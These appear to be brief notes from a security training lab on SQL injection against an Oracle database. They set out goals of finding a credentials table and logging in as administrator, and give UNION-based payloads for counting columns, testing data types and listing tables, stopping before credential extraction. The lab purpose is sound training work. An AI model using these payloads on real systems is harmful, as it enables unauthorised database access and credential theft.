Lab #10 - SQL injection attack, listing the databse contents on Oracle

End Goals: 
- Determine which table contains the usernames and password
- Determine the column names in table
- Outupt the content of the table
- Login as the administartor user


Analysis:

1) Determine the number of columns
' order by 3 -- -> internal server error

3 - 1 = 2

2) Find data type of columns
' UNION select 'a', 'a' from DUAL --
-> Oracle database
-> both columns accept type text

3) Output the list of tables in the database

' UNION SELECT table_name, NULL FROM all_tables
